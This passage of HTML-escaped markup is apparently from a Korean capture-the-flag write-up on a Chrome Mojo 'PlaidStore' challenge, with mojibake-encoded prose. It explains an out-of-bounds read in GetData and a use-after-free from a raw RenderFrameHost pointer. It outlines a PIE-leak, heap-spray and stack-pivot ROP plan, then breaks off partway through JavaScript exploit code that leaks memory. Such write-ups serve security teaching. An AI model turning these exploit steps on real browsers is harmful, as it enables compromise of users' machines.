  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_store_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({});&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì²«ë²ˆì§¸ ì·¨ì•½ì ì€ GetData í•¨ìˆ˜ì— ìˆë‹¤. GetData í•¨ìˆ˜ëŠ” ì¸ìë¡œ key, countë¥¼ ë°›ëŠ”ë° countì— ëŒ€í•œ ë²”ìœ„ ê²€ì‚¬ê°€ ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë‹¤. ë”°ë¼ì„œ ì›í•˜ëŠ” ë§Œí¼ ë©”ëª¨ë¦¬ë¥¼ ì½ì–´ ë°˜í™˜í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/7bacb2f1-3ed4-480e-b685-34eecdee7029/f3659752-c967-4a31-85d6-02b115109455.png&quot; alt=&quot;/assets/7bacb2f1-3ed4-480e-b685-34eecdee7029/f3659752-c967-4a31-85d6-02b115109455.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;data_store_ì—ì„œ 65(A), 66(B)ì´ ìˆëŠ” ì‚¬ì´ì¦ˆ 16ì˜ vectorë¥¼ ì €ì¥í•˜ê³  ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•´ì„œ ë’¤ì— ë©”ëª¨ë¦¬ê¹Œì§€ ì½ì€ ëª¨ìŠµì´ë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ë‘ë²ˆì§¸-ì·¨ì•½ì &quot;&gt;ë‘ë²ˆì§¸ ì·¨ì•½ì &lt;/h3&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gd&quot;&gt;--- a/content/browser/browser_interface_binders.cc
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/content/browser/browser_interface_binders.cc
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -86,6 +86,7 @@&lt;/span&gt;
 #include &quot;third_party/blink/public/mojom/payments/payment_app.mojom.h&quot;
 #include &quot;third_party/blink/public/mojom/permissions/permission.mojom.h&quot;
 #include &quot;third_party/blink/public/mojom/picture_in_picture/picture_in_picture.mojom.h&quot;
&lt;span class=&quot;gi&quot;&gt;+#include &quot;third_party/blink/public/mojom/plaidstore/plaidstore.mojom.h&quot;
&lt;/span&gt; #include &quot;third_party/blink/public/mojom/presentation/presentation.mojom.h&quot;
 #include &quot;third_party/blink/public/mojom/quota/quota_dispatcher_host.mojom.h&quot;
 #include &quot;third_party/blink/public/mojom/sms/sms_receiver.mojom.h&quot;
&lt;span class=&quot;p&quot;&gt;@@ -109,6 +110,7 @@&lt;/span&gt;
 #include &quot;third_party/blink/public/mojom/serial/serial.mojom.h&quot;
 #endif
 
&lt;span class=&quot;gi&quot;&gt;+
&lt;/span&gt; #if defined(OS_ANDROID)
 #include &quot;content/browser/android/date_time_chooser_android.h&quot;
 #include &quot;content/browser/android/text_suggestion_host_android.h&quot;
&lt;span class=&quot;p&quot;&gt;@@ -660,6 +662,10 @@&lt;/span&gt; void PopulateFrameBinders(RenderFrameHostImpl* host,
   map-&amp;gt;Add&amp;lt;blink::mojom::SerialService&amp;gt;(base::BindRepeating(
       &amp;amp;RenderFrameHostImpl::BindSerialService, base::Unretained(host)));
 #endif  // !defined(OS_ANDROID)
&lt;span class=&quot;gi&quot;&gt;+
+  map-&amp;gt;Add&amp;lt;blink::mojom::PlaidStore&amp;gt;(
+      base::BindRepeating(&amp;amp;RenderFrameHostImpl::CreatePlaidStore,
+                          base::Unretained(host)));
&lt;/span&gt; }
 
 void PopulateBinderMapWithContext(
&lt;span class=&quot;gh&quot;&gt;diff --git a/content/browser/frame_host/render_frame_host_impl.cc b/content/browser/frame_host/render_frame_host_impl.cc
index e55e2d990da4..df6e6e62dbae 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/content/browser/frame_host/render_frame_host_impl.cc
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/content/browser/frame_host/render_frame_host_impl.cc
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -80,6 +80,7 @@&lt;/span&gt;
 #include &quot;content/browser/permissions/permission_controller_impl.h&quot;
 #include &quot;content/browser/permissions/permission_service_context.h&quot;
 #include &quot;content/browser/permissions/permission_service_impl.h&quot;
&lt;span class=&quot;gi&quot;&gt;+#include &quot;content/browser/plaidstore/plaidstore_impl.h&quot;
&lt;/span&gt; #include &quot;content/browser/portal/portal.h&quot;
 #include &quot;content/browser/presentation/presentation_service_impl.h&quot;
 #include &quot;content/browser/push_messaging/push_messaging_manager.h&quot;
&lt;span class=&quot;p&quot;&gt;@@ -6619,6 +6620,11 @@&lt;/span&gt; void RenderFrameHostImpl::CreateInstalledAppProvider(
   InstalledAppProviderImpl::Create(this, std::move(receiver));
 }
 
&lt;span class=&quot;gi&quot;&gt;+void RenderFrameHostImpl::CreatePlaidStore(
+    mojo::PendingReceiver&amp;lt;blink::mojom::PlaidStore&amp;gt; receiver) {
+  PlaidStoreImpl::Create(this, std::move(receiver));
+}
+
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë‘ë²ˆì§¸ ì·¨ì•½ì ì€ RenderFrameHostì˜ lifetimeë•Œë¬¸ì— ë°œìƒí•œë‹¤. RenderFrameHostë€ ë¸Œë¼ìš°ì €ì—ì„œ frameì„ ë‚˜íƒ€ë‚¸ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gi&quot;&gt;+
+  map-&amp;gt;Add&amp;lt;blink::mojom::PlaidStore&amp;gt;(
+      base::BindRepeating(&amp;amp;RenderFrameHostImpl::CreatePlaidStore,
+                          base::Unretained(host)));
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;RenderFrameHostImpl::CreatePlaidStoreë¥¼ ë°”ì¸ë”©í•  ë•Œ, ì¸ìì¸ host(content::RenderFrameHost)ë¥¼ pointer(base::Unretained)ë¡œ ì „ë‹¬í•œë‹¤.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;base::Unretained() - disables the refcounting of member function receiver objects (which may not be of refcounted types) and the COMPILE_ASSERT on function arguments. Use with care, since it implies you need to make sure the lifetime of the object lasts beyond when the callback can be invoked. For the member function receiver object, itâ€™s probably better to use a base::WeakPtr instead.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ì´ &lt;a href=&quot;https://www.chromium.org/developers/coding-style/important-abstractions-and-data-structures&quot;&gt;ë§í¬&lt;/a&gt;ì— ë”°ë¥´ë©´ base::Unretained()ì€ refcountingì„ ë¹„í™œì„±í™”í•œ pointerë¥¼ ì²˜ë¦¬í• ë•Œ ì‚¬ìš©í•œë‹¤. í¬ë¡¬ì—ì„œ ëŒ€ë¶€ë¶„ì˜ ê°ì²´ë“¤ì€ ìŠ¤ë§ˆíŠ¸ í¬ì¸í„°ì— ì˜í•´ ìˆ˜ëª…ì´ ê´€ë¦¬ë˜ëŠ”ë° ì € íƒœê·¸ë¥¼ í†µí•´ ì¸ìë¥¼ ì „ë‹¬í•˜ëŠ” ê²½ìš° refcounted ê°ì²´ê°€ ì•„ë‹Œ raw pointer ê·¸ëŒ€ë¡œ ì „ë‹¬í•˜ê²Œ ëœë‹¤.
ë”°ë¼ì„œ PlaidStoreImplëŠ” RenderFrameHost ê°ì²´ë¥¼ raw pointerë¡œ ê°€ì§€ê³  ìˆê³ , ì„œë¹„ìŠ¤ë³´ë‹¤ host ê°ì²´ê°€ ë” ë¹¨ë¦¬ í•´ì œëœ ìƒíƒœì—ì„œ PlaidStoreImpl í•¨ìˆ˜ë“¤ì„ í˜¸ì¶œí•˜ë©´ use-after-free ì·¨ì•½ì ì´ ë°œìƒí•˜ê²Œ ëœë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gi&quot;&gt;+void PlaidStoreImpl::StoreData(
+    const std::string &amp;amp;key,
+    const std::vector&amp;lt;uint8_t&amp;gt; &amp;amp;data) {
+  if (!render_frame_host_-&amp;gt;IsRenderFrameLive()) {
+    return;
+  }
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
+void PlaidStoreImpl::GetData(
&lt;span class=&quot;gi&quot;&gt;+    const std::string &amp;amp;key,
+    uint32_t count,
+    GetDataCallback callback) {
+  if (!render_frame_host_-&amp;gt;IsRenderFrameLive()) {
+    std::move(callback).Run({});
+    return;
+  }
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;UAF ì·¨ì•½ì ì´ ë°œìƒí•˜ê²Œ ë˜ë©´, storeDataì™€ getData í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ render_frame_host_ê°€ freeëœ pointerì´ë‹¤. ê·¸ë˜ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;render_frame_host_-&amp;gt;IsRenderFrameLive()&lt;/code&gt; í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ í¬ë˜ì‹œê°€ ë°œìƒí•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/0350c1e2-6822-4c6e-ae56-7aa843a72534/32e97a92-7980-40d2-809d-85883f145779.png&quot; alt=&quot;/assets/0350c1e2-6822-4c6e-ae56-7aa843a72534/32e97a92-7980-40d2-809d-85883f145779.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•˜ë©´ ìœ„ì™€ê°™ì€ ëª¨ìŠµì´ë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;call qword ptr [rax + 0x160]&lt;/code&gt; ì—ì„œ í¬ë˜ì‹œê°€ ë°œìƒí•˜ë©° raxê°€ ì´ìƒí•œ ê°’ìœ¼ë¡œ ë®í˜€ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;2-exploit&quot;&gt;2. Exploit&lt;/h1&gt;

&lt;p&gt;exploitì€ ì—¬ëŸ¬ê°€ì§€ ë°©ë²•ìœ¼ë¡œ ì‹œë„í•  ìˆ˜ ìˆë‹¤. ì‹œë„í•œ ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;memory leak ì·¨ì•½ì ì„ ì´ìš©í•´ chrome binary baseë¥¼ êµ¬í•œë‹¤. (pie ìš°íšŒ)&lt;/li&gt;
  &lt;li&gt;ì›í•˜ëŠ” ê°’ì´ ìˆê³  ì£¼ì†Œë¥¼ ì•„ëŠ” heap ë©”ëª¨ë¦¬ë¥¼ ë§Œë“ ë‹¤. (rop chain êµ¬ì„±ì„ ìœ„í•´ì„œ)&lt;/li&gt;
  &lt;li&gt;sprayë¥¼ í†µí•´ raxë¥¼ heap ë©”ëª¨ë¦¬ë¡œ ë³€ê²½í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;push rax; pop rsp; ret ê°€ì ¯ì„ í†µí•´ ìŠ¤íƒì„ í”¼ë²—í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;flagë¥¼ ì½ëŠ”ë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;1-chrome-binary-base-ì£¼ì†Œ-êµ¬í•˜ê¸°&quot;&gt;1. chrome binary base ì£¼ì†Œ êµ¬í•˜ê¸°&lt;/h3&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leak_pie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStorePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;Mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bindInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
	  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	  &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	      &lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStorePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
	      &lt;span class=&quot;nx&quot;&gt;Mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bindInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	      &lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;storeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	      &lt;span class=&quot;nx&quot;&gt;spr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;storeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// find pie&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
